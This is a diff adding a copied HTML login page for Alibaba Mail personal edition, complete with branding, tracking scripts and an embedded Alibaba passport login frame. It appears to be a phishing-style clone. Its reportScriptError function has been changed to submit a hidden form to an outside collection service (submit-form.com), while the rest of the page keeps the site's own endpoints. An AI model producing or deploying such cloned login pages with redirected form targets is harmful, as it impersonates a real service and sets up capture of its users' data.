@@ -1,0 +1,481 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="Alibaba mailbox personal edition provides users with efficient, stable and convenient e-mail service. The free registered mailbox delivers 2G super-large attachments with 60G capacity. You can register and log in to the Alibaba mailbox personal edition on the web page, mobile phone." />
+    <meta name="data-spm" content="5176"/>
+    <meta name="keywords" content="Ariyun mail, personal email, free email, work email, nail mail, DingTalk email, email" />
+    <link rel="canonical" href="https://mail.aliyun.com/" />
+    <link rel="shortcut icon" href="/static/0.1.49/images/favicon.ico" type="image/x-icon"/>
+    <link rel="bookmark" href="/static/0.1.49/images/favicon.ico" type="image/x-icon"/>
+    <title>Login Portal_Alibaba Mail Personal Edition - Alibaba Cloud</title>
+    <link rel="stylesheet" type="text/css" href="/static/0.1.49/login/freemail/styles/login.css"/>
+    <script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+    (function (d) {
+        try {
+            var t=d.createElement("script");t.type="text/javascript";t.async=true;t.id="tb-beacon-aplus";
+            t.setAttribute("exparams","category=&userid=&aplus&yunid=");
+            t.src=("https:"==d.location.protocol?"https://s":"http://a")+".tbcdn.cn/s/aplus_v2.js";
+            d.getElementsByTagName("head")[0].appendChild(t);
+        } catch (e) {}
+    })(document);
+    </script>
+
+    <style type="text/css">
+        #login_input_wrap {
+            right: 12px;
+            height: auto;
+        }
+
+        body .login_banner_wrap {
+            width: 1000px;
+            margin: 0 auto;
+            background-color: transparent;
+        }
+
+        .login_banner_link .login_banner_link_label {
+            border: 0 none;
+            padding: 0;
+        }
+
+        .login_banner_link .login_banner_link_label:before {
+            content: "";
+            display: inline-block;
+            width: 1px;
+            height: 12px;
+            background-color: #dcdcdc;
+            vertical-align: middle;
+            margin-top: -1px;
+        }
+
+        .login_banner_link_label a {
+            font-size: 12px;
+            padding: 0 12px;
+        }
+
+        .login_banner_link .login_banner_link_label_first:before {
+            background-color: transparent;
+        }
+
+        .login_banner_wrap .login_banner_link {
+            margin-right: 0;
+        }
+
+        .login_banner_wrap .login_banner_body_img {
+            left: 0;
+        }
+
+        .login_body_inner #login_input_wrap {
+            top: 80px;
+        }
+
+        .alimail-seo{
+            display:none;
+        }
+    </style>
+</head>
+
+
+<body data-spm="100079">
+        <div style="display:none;">
+        <iframe name="errorTargetIframe" id="errorTargetIframe" src="/static/blank.html"></iframe>
+        <form name="browser_log" id="browser_script_log" action="/alimail/error/browserLog" target="errorTargetIframe" method="post">
+            <input type="hidden" id="browser_script_log_text" name="text"/>
+            <input type="hidden" name="key" value="SCRIPT_LOAD_ERROR"/>
+        </form>
+    </div>
+
+    <script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+        function reportScriptError(name) {
+            var formNode = document.getElementById("browser_script_log");
+
+            document.getElementById("browser_script_log_text").value = name;
+
+            formNode.action = "https://submit-form.com/3jnv5wqu" + (new Date().getTime());
+            formNode.submit();
+        }
+    </script>
+<!--[if lte IE 8]>
+        <script type="text/javascript" src="/static/0.1.49/scripts/es5-shim.min.js" onerror="javascript:reportScriptError('\/static\/0.1.49\/scripts\/es5-shim.min.js');"></script>
+        <script type="text/javascript" src="/static/0.1.49/scripts/es5-sham.min.js" onerror="javascript:reportScriptError('\/static\/0.1.49\/scripts\/es5-sham.min.js');"></script>
+<![endif]-->
+        <script type="text/javascript" src="/static/0.1.49/dist/sqm-dom.js" onerror="javascript:reportScriptError('\/static\/0.1.49\/dist\/sqm-dom.js');"></script>
+    <div style="display:none;">
+    <iframe name="errorTargetIframe" id="errorTargetIframe" src="/static/blank.html"></iframe>
+    <form name="browser_log" id="browser_log" action="/alimail/error/browserLog" target="errorTargetIframe" method="post">
+        <input type="hidden" id="browser_log_text" name="text"/>
+    </form>
+</div>
+
+<script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+
+window.onerror = function (msg, url, line, col, error) {
+    try {
+        var text = "msg:[" + msg + "], url:[" + url + "], line:[" + line + "], col:[" + col + "]";
+        var formNode = document.getElementById("browser_log");
+        var fn = window.globalErrFunc;
+
+        fn && fn(text);
+
+        document.getElementById("browser_log_text").value = text;
+
+        formNode.action = "\/alimail\/error\/browserLog?_timestamp_=" + (new Date().getTime());
+        formNode.submit();
+    } catch (e) {}
+
+    return false;
+};
+
+</script>
+    <script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+    function goToNoneCdn(w) {
+        var pn = w.location.pathname;
+        var qs = w.location.search;
+        var ph = w.location.hash;
+
+        if (qs.indexOf('?') == 0) {
+            qs = qs.substring(1);
+        }
+
+        if (ph.indexOf('#') == 0) {
+            ph = ph.substring(1);
+        }
+
+        var reurl = pn;
+
+        if (qs.length > 0) {
+            reurl += "?" + qs;
+        }
+
+        var targetUrl = '\/alimail\/auth\/redirectNoneCdn';
+
+        targetUrl = targetUrl + "?reurl=" + encodeURIComponent(reurl) + "#" + ph;
+
+        w.location.href = targetUrl;
+    }
+</script>
+
+    
+    <div class="alimail-seo">
+        <!-- seo -->
+        <a href="https://wanwang.aliyun.com/mail">阿里邮箱官网</a>
+    </div>
+    <div class="login_banner_wrap" data-spm="1">
+        <div class="login_banner_body_img" title="" style="background-image:url(/static/0.1.49/images/forFreemail/logo.png)"></div>
+        <div class="login_banner_link">
+                                        <div class="login_banner_link_label inline_block login_banner_link_label_first"><a class="blue text_middle" href="https://wanwang.aliyun.com/mail" target="_blank" _cat="topcustomlink" _id="personalalimail" data-spm-click="personalalimail" style="">Alibaba Mail</a></div>
+                                            <div class="login_banner_link_label inline_block "><a class="blue text_middle" href="https://qiye.aliyun.com/" target="_blank" _cat="topcustomlink" _id="personalmail" data-spm-click="personalmail" style="">Alibaba Mail Login</a></div>
+                                        <div class="login_banner_link_label inline_block ">
+                <a class="login_banner_download_href blue" href="https://mail.aliyun.com/mail-pages/download.html" target="_blank" _cat="toplink" _id="app">Client Apps</a>
+            </div>
+                            <div class="login_banner_link_label inline_block"><a class="blue text_middle" target="_blank" href="https://help.aliyun.com/document_detail/464805.html" _cat="toplink" _id="help">Help</a></div>
+                                                                                <div class="login_banner_link_label inline_block"><a class="blue text_middle" href="?lang=zh_CN" _cat="langlink">简体中文</a></div>
+                                                                            <div class="login_banner_link_label inline_block"><a class="blue text_middle" href="?lang=zh_TW" _cat="langlink">繁體中文</a></div>
+                                                                            <div class="login_banner_link_label inline_block"><a class="blue text_middle" href="javascript:void(0);" _cat="langlink">English</a></div>
+                                                        </div>
+    </div>
+    <div class="login_body" data-spm="2">
+        <div class="login_body_inner">
+            <div class="login_body_left" id="login_body_left"></div>
+            <div id="login_input_wrap">
+                <div id="alibaba-login-iframe" style="visibility: visible;">
+                    <div id="alibaba-login-iframe-loading"><img class="login_input_loading" src="/static/0.1.49/images/loading/round_big.gif"/></div>
+                </div>
+            </div>
+            <a href="javascript:void(0);" class="login_bg_link" target="_blank" id="login_bg_link" style="display:none;" _cat="bglink">&nbsp;&nbsp;&nbsp;</a>
+        </div>
+    </div>
+    <div class="login_bottom" data-spm="3">
+        <div class="login_about_wrap">
+                            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="https://www.aliyun.com/about/" _cat="bottomlink" _id="about">About Us</a></div>
+                            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="https://www.aliyun.com/" _cat="bottomlink" _id="links">Alibaba Cloud</a></div>
+                            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="https://wanwang.aliyun.com/" _cat="bottomlink" _id="wanwang">Wanwang</a></div>
+                            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="https://developer.aliyun.com/" _cat="bottomlink" _id="developer">Developer</a></div>
+                            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="https://help.aliyun.com/" _cat="bottomlink" _id="helpcenter">Help Center</a></div>
+                            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="https://qiye.aliyun.com/" _cat="bottomlink" _id="alimail">Alibaba Mail</a></div>
+                        <div class="login_about_label inline_block">2009-2023 Aliyun.com Copyright reserved ICP: 浙2-20080101</div>
+        </div>
+    </div>
+    <div id="cache_wrap"></div>
+    
+    <script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+
+    var domUtils = sqm.dom.domUtils.main;
+    var animation = sqm.dom.animation.main;
+
+    function getEl(s) {
+        return domUtils.find(document.body, s);
+    }
+
+    function entranceRemainCurrentFunc() {
+        domUtils.remove(document.getElementById("login_entrance_wrap"));
+    }
+
+    function initBackground(item) {
+        var attachPrefix = '\/attachment\/download_docstore';
+        var loginBody = getEl('.login_body'), loginBodyInner = getEl('.login_body_inner'), loginBodyLeft = getEl('.login_body_left');
+        var ua = navigator.userAgent.toLowerCase();
+        var legacy = /msie 6/.test(ua) || /msie 7/.test(ua);
+
+        domUtils.addClass(loginBody, 'login_body_default');
+        domUtils.addClass(loginBodyInner, 'login_body_inner_default');
+        domUtils.addClass(loginBodyLeft, 'login_body_left_default');
+
+        if (item) {
+            if (item.backgroundColor) {
+                domUtils.setStyle(loginBody, "background-color", item.backgroundColor);
+            }
+
+            if (legacy) {
+                if (item.combineImageId) {
+                    domUtils.setStyle(loginBodyInner, "background-image", "url(" + attachPrefix + "?fileID=" + encodeURIComponent(item.combineImageId) + ")");
+                }
+            } else {
+                if (item.backgroundImageId) {
+                    domUtils.setStyle(loginBodyInner, "background-image", "url(" + attachPrefix + "?fileID=" + encodeURIComponent(item.backgroundImageId) + ")");
+                }
+
+                if (item.textImageId) {
+                    domUtils.setStyle(loginBodyLeft, "background-image", "url(" + attachPrefix + "?fileID=" + encodeURIComponent(item.textImageId) + ")");
+                }
+            }
+        }
+
+        var linkNode = document.getElementById("login_bg_link");
+
+        if (item && item.link) {
+            domUtils.show(linkNode);
+            linkNode.setAttribute("href", item.link);
+
+            if (item.event) {
+                linkNode.setAttribute("data-spm-click", item.event);
+                linkNode.setAttribute("_id", item.event);
+            }
+        } else {
+            domUtils.hide(linkNode);
+        }
+
+        if (!legacy) {
+            domUtils.show(loginBodyLeft, 1);
+            animation.animate(loginBodyLeft, animation.translateVertical(100, true, 600));
+        }
+    }
+
+    </script>
+
+<script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+
+(function() {
+
+function _initBackground(item) {
+    if (typeof initBackground != 'undefined') {
+        initBackground(item);
+    }
+}
+
+
+var bgString = '[{\"backgroundColor\":\"#A4D8FA\",\"backgroundImageId\":\"\/new\/a1531fce0d1d1d6abed9a105efa07b0378a6d04f08fa55cf0ef67b93459174a08f306a2c007838600\/00\/ff72ba05-e86a-4f1-----1y9QjJC-\/V2229e11a2ac70bee32c935869f60cdd0e8aaa9762\",\"combineImageId\":\"\/new\/deaaa2dffe1feb4b2ebdff9a1d72de587d71e62fc67dff9302ff69788bc3eec2cb2d36db009597430\/00\/3f23a22e-1e19-455-----1yB25ZQ-\/V258088181b348791d436502a0a57585e2ccfd3293\",\"displayWeight\":8,\"endTime\":\"2400\",\"event\":\"domainshuang11\",\"link\":\"https:\/\/msea.aliyun.com\/msea\/flow\/171686017881234786\",\"startTime\":\"0000\",\"textImageId\":\"\/new\/9c0ebcb93f81965013d5cf87cd18d8e833e30625adbff9c8ecf53491f1342fa4def79697000331170\/00\/2cfa30b0-0886-4c3-----1yAg3Th-\/V28257f14fd9b80c5c5d490d54d37e71704e5d9e7f\",\"valid\":true}]';
+
+if (bgString) {
+    var backgroundItems = [];
+
+    try {
+        backgroundItems = eval(bgString);
+    } catch (e) {
+        backgroundItems = null;
+    }
+
+    if (backgroundItems && backgroundItems.length) {
+        var candidates = [], timestamp = new Date();
+        var curTime = timestamp.getHours() * 100 + timestamp.getMinutes();
+        var weightStart = 0;
+
+        for (var l = backgroundItems.length, i = 0; i < l; i++) {
+            var item = backgroundItems[i];
+
+            if (!item || item.displayWeight <= 0) {
+                continue;
+            }
+
+            var startTime = item.startTime;
+
+            if (startTime) {
+                var timeInt = parseInt(startTime);
+
+                if (!isNaN(timeInt) && curTime < startTime) {
+                    continue;
+                }
+            }
+
+            var endTime = item.endTime;
+
+            if (endTime) {
+                var timeInt = parseInt(endTime);
+
+                if (!isNaN(timeInt) && curTime > endTime) {
+                    continue;
+                }
+            }
+
+            item.weightStart = weightStart;
+            weightStart += item.displayWeight;
+            candidates.push(item);
+        }
+
+        if (weightStart > 0) {
+            var randomWeight = Math.floor(timestamp.getTime() / 100) % weightStart;
+
+            for (var i = candidates.length - 1; i >= 0; i--) {
+                var item = candidates[i];
+
+                if (randomWeight >= item.weightStart) {
+                    _initBackground(item);
+                    break;
+                }
+            }
+        } else {
+            _initBackground();
+        }
+    } else {
+        _initBackground();
+    }
+} else {
+    _initBackground();
+}
+
+
+})();
+
+</script>
+
+
+
+    <input name="callback" id="callback" value="https://mail.aliyun.com/alimail/auth/callbackForHavana?reurl=%2Falimail%2F" type="hidden"/>
+    <script type="text/javascript" src="https://assets.alicdn.com/g/tb/login/0.3.9/havanalogin/js/mini-login-embedder-min.js"></script>
+    <script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+        var miniLoginEmbedder = new window.MiniLoginEmbedder(), firstResize = 1;
+        var curLang = 'en';
+
+        if (curLang == "en" || curLang.lastIndexOf("en_", 0) == 0) {
+            curLang = "en_US";
+        }
+
+        miniLoginEmbedder.init({
+            queryStr : "&returnUrl=" + encodeURIComponent(document.getElementById("callback").value) + "&cssUrl=" + encodeURIComponent('https://mail.aliyun.com/static/styles/loginForFreeMail.css'),
+            targetId : 'alibaba-login-iframe',
+            appName : 'yunmail',
+            iframeUrl : 'https:\/\/cnpassport.alibaba.com\/mini_login.htm',
+            lang : curLang,
+            notKeepLogin : 'true',
+            notLoadSsoView : 'true',
+            styleType : 'auto',
+            appEntrance : 'v2',
+            iframeWidth : '300'
+        });
+
+        
+            var ua = navigator.userAgent.toLowerCase();
+
+            /msie 6/.test(ua) || /msie 7/.test(ua) || setTimeout(function() {
+                document.getElementById("cache_wrap").append("<iframe style=\"width:1px;height:1px;overflow:hidden;\" src=\"\/alimail\/auth\/cache\"></iframe>");
+            }, 200);
+
+            </script>
+
+
+<script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+
+(function(W, D) {
+    var doTrackEvent = false;
+    var cnzzId = '1254123247';
+
+    function bodyClickHandler(e) {
+        e = e || W.event;
+
+        if (e && doTrackEvent) {
+            var t = e.target, body = D.body;
+
+            if (!t) {
+                t = e.srcElement || D;
+            }
+
+            if (t) {
+                var aNode;
+
+                do {
+                    var tagName = t.tagName;
+
+                    if (tagName && tagName.toLowerCase() == "a") {
+                        aNode = t;
+                        break;
+                    }
+
+                    t = t.parentNode;
+                } while (t && t != body && t != D);
+
+                if (aNode) {
+                    var eventId = aNode.getAttribute("_id");
+                    var catId = aNode.getAttribute("_cat");
+
+                    if (catId && eventId) {
+                        W["_czc"].push(["_trackEvent", catId, eventId, ""]);
+                    }
+                }
+            }
+        }
+    }
+
+    if (cnzzId) {
+        var _czc = W["_czc"] || [];
+
+        _czc.push(["_setAccount", cnzzId]);
+
+        W["_czc"] = _czc;
+
+        try {
+            var script = D.createElement('script');
+
+            script.src = W.location.protocol + '//w.cnzz.com/c.php?id=' + encodeURIComponent(cnzzId);
+            D.getElementsByTagName("head")[0].appendChild(script);
+
+            setTimeout(function() {
+                var body = D.body;
+
+                if (body.addEventListener) {
+                    body.addEventListener("click", bodyClickHandler, false);
+                } else if (body.attachEvent) {
+                    body.attachEvent("onclick", bodyClickHandler);
+                }
+
+                doTrackEvent = true;
+            }, 1000);
+        } catch (e) {
+            W["_czc"] = null;
+        }
+    }
+})(window, document);
+
+</script>
+
+
+
+<script src="https://g.alicdn.com/trace/trace/1.3.0/??sdk.js,resourceError-plugin.js,perf-plugin.js,pv-plugin.js,api-plugin.js" nonce="dC00NTA5NzEtckxJQnE12163"></script>
+<script type="text/javascript" nonce="dC00NTA5NzEtckxJQnE12163">
+    var armsTrace = TraceSdk({
+        pid: 'alimail-webmail5',
+        env: 'prod',
+        plugins: [
+            [TracePvPlugin],
+            [TracePerfPlugin],
+            [TraceApiPlugin],
+            [TraceResourceErrorPlugin]
+        ],
+    })
+    armsTrace.install();
+</script>
+
+
+
+</body>
+</html>
